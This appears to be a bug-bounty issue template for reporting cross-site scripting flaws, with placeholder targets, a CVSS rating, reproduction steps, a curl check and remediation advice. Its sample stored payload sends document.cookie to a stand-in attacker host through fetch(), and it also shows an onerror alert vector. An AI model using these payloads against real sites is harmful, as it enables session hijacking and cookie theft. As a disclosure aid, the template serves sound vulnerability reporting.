---
name: "SOP-02: Cross-Site Scripting (XSS / HTML Injection)"
about: "Rapid reporting template for Stored, Reflected, or DOM-based Cross-Site Scripting vulnerabilities."
title: "[XSS] <Stored/Reflected/DOM> Cross-Site Scripting in <Component/Parameter>"
labels: ["vulnerability-advisory", "xss", "p2-medium"]
assignees: []
---

## 🛡️ Vulnerability Title
**[XSS] `[Stored / Reflected / DOM]` Cross-Site Scripting in `[Parameter/Field]` on `[Vulnerable Endpoint]`**

---

### 1. Executive Summary
A Cross-Site Scripting (XSS) vulnerability was identified in `[Target Program / Subsystem]`. User input passed via `[Parameter/Field]` is rendered in the victim's browser context without adequate sanitization, output encoding, or Content Security Policy (CSP) enforcement. This allows an attacker to execute arbitrary client-side JavaScript in the victim's session, enabling session hijacking, CSRF token theft, or malicious actions on behalf of the user.

---

### 2. Vulnerability & Impact Classification
- **Target Platform:** HackerOne / Bugcrowd / GitHub
- **Asset / URL:** `https://app.target.com/settings/...`
- **Vulnerability Class:** CWE-79: Improper Neutralization of Input During Web Page Generation
- **CVSS v3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- **Base Score:** **6.1 (Medium)** (Up to **7.5+** if session tokens or privileged admin actions are exposed)
- **Severity Tier:** Medium (P2) / High (P1)

---

### 3. Vulnerable Component & Context
- **Vulnerable URL:** `https://app.target.com/portal/invite?team_name=...`
- **Injection Parameter:** `team_name`
- **Execution Context:** HTML Body / Attribute / Script Context
- **CSP Status:** Missing or unsafe (`unsafe-inline` / no nonce protection)

---

### 4. Step-by-Step Reproduction Guide
1. Navigate to the target page or prepare the crafted vector URL:
```text
https://app.target.com/portal/invite?team_name=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```
2. For Stored XSS:
   - Input payload into the `[Field Name]` form field:
   ```html
   "><svg/onload=fetch('https://attacker-collaborator.com/c?'+document.cookie)>
   ```
   - Save the form and have a secondary victim account view the resource.
3. Observe JavaScript execution executing `alert(document.domain)` in the application context.

---

### 5. Curl Proof of Concept
```bash
curl -ik -s "https://app.target.com/portal/invite?team_name=%22%3E%3Cimg%20src=x%20onerror=console.log(document.domain)%3E" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" | grep -i "onerror=console.log"
```

---

### 6. Remediation & Hardening Guidance
1. **Context-Aware Output Encoding:**
   Use HTML entity encoding on all user-controlled data rendered in HTML context.
2. **Deploy Strict Content Security Policy (CSP):**
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';
   ```
3. **Cookie Hardening:**
   Ensure sensitive session cookies set `HttpOnly`, `Secure`, and `SameSite=Lax/Strict`.
